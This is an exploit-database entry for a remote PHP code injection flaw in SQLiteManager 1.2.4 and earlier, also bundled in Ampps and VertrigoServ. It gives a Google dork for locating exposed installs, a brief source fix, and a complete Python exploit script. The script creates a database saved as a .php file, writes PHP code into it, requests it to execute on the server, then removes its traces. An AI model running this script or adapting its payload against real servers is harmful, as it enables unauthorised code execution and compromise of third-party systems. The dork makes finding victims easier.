Description:
===============================================================
Exploit Title: SQLiteManager 0Day Remote PHP Code Injection Vulnerability
Google Dork: intitle:SQLiteManager inurl:sqlite/
Date: 23/01/2013
Exploit Author: RealGame
Vendor Homepage: http://www.Relagame.co.il
Software Link: http://sourceforge.net/projects/sqlitemanager/
Version: <=1.2.4
Tested on: Windows XP, Debian 2.6.32-46
CVE: N/A
===============================================================
Vulnerable Softwares:

Name: SQLiteManager
Official Site: http://www.sqlitemanager.org/

Name: Ampps
Official Site: http://www.ampps.com/

Name: VertrigoServ
Official Site: http://vertrigo.sourceforge.net/
===============================================================
About Software:
Official Site: http://www.sqlitemanager.org/
SQLiteManager is a database manager for SQLite databases. You can manage
any SQLite database created on any platform with SQLiteManager.
===============================================================
Easy Way To Fix:
Find: SQLiteStripSlashes($_POST['dbpath'])
Replace: str_replace('.', '', SQLiteStripSlashes($_POST['dbpath']))
On File: ./include/add_database.php
===============================================================

import re
import urllib2
from urllib import urlencode
from sys import argv, exit

def strip_tags(value):
    #Strip tags with RegEx
    return re.sub('<[^>]*?>', '', value)

def getDbId(sqliteUrl, myDbName):
    #Find Components
    htmlRes = urllib2.urlopen(sqliteUrl, None, 120).read()
    if htmlRes:
        #If you found it take all the rows
        td = re.findall('<td class="name_db">(.*?)</td>', htmlRes, re.DOTALL)
        #Make a dict of stripped columns
        for element in td: 
            if strip_tags(element) == myDbName:
                #Return Id
                return "".join(re.findall('\?dbsel=(.*?)"', element, re.DOTALL))
    return None

def main():
    print \
        'SQLiteManager Exploit\n' + \
        'Made By RealGame\n' + \
        'http://www.RealGame.co.il\n'
    
    if len(argv) < 2:
        #replace('\\', '/') - To Do The Same In Win And Linux
        filename = argv[0].replace('\\', '/').split('/')[-1]
        
        print 'Execute Example: ' + filename + ' http://127.0.0.1/sqlite/\n'
        exit()
    
    sqliteUrl = argv[1]     
    myDbName  = "phpinfo"
    myDbFile  = "phpinfo.php"
    #Create Database
    params = {'dbname'      : myDbName,
              'dbVersion'   : '2',
              'dbRealpath'  : None,
              'dbpath'      : myDbFile,
              'action'      : 'saveDb'}
    urllib2.urlopen(sqliteUrl + "main.php", urlencode(params), 120)
    #Get Database ID
    dbId = getDbId(sqliteUrl + "left.php", myDbName)
    #If Database Created
    if dbId:
        #Create Table + Shell Creator
        params = {'DisplayQuery'    : 'CREATE TABLE temptab ( codetab text );\n' + \
                                      'INSERT INTO temptab VALUES (\'<?php phpinfo(); unlink(__FILE__); ?>\');\n',
                  'sqlFile'         : None,
                  'action'          : 'sql',
                  'sqltype'         : '1'}
        urllib2.urlopen(sqliteUrl + "main.php?dbsel=%s&table=temptab" %dbId, urlencode(params), 120)
        #Inject Code
        urllib2.urlopen(sqliteUrl + myDbFile, None, 120)
        #Remove Database
        urllib2.urlopen(sqliteUrl + "main.php?dbsel=%s&table=&view=&trigger=&function=&action=del" %dbId, None, 120)
        
        print 'Succeed'
        return
        
    print 'Failed'

if __name__ == '__main__':
    main()
